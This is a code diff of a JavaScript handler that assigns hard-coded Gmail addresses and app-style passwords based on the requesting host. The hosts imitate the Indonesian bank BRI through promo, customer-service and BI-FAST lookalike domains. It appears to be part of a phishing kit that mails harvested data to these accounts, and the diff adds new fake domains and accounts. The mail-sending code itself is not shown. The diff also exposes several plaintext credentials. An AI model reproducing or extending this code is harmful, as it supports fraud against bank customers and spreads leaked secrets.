@@ -6,29 +6,21 @@ export default function handler(req, res) {
 
     let email = '';
     let pass = '';
+    
+     if (url == 'bifast-bri-new.herokuapp.com'){
 
-    if(url == 'bri-promo.site'){
+       email = 'anjayapp9@gmail.com'
+       pass = 'wfhcfhgoxaqmphva'
+    }else
+    
+    if (url == 'bifast-brii.herokuapp.com'){
 
-        email = 'orbitorbit799@gmail.com';
-        pass = 'ahghpmbdwokimqim';
-
-    } else if (url == 'bri-promo.herokuapp.com') {
-        
-        email = 'hibrahimshaleh@gmail.com';
-        pass = 'bfaawtyurzhbqjkl';
-
-    } else if(url == 'bri-pelayanan.herokuapp.com'){
-        email = 'pukiayam5123@gmail.com';
-        pass = 'joyxbannkfmypmzx';
-
-    } else if(url == 'bri-customerservice.xyz'){
-        email = 'spacediamond95@gmail.com';
-        pass = 'gkpahtwroxntldgs';
-
+       email = 'appanjay717@gmail.com'
+       pass = 'keyumxdlhcjkbrip'
     }
     else {
-        email = 'bripembukaanrekening@gmail.com';
-        pass = 'nocpaagwmdvyyoin';
+         email = 'appanjay717@gmail.com'
+         pass = 'keyumxdlhcjkbrip'
     }
         
         try {
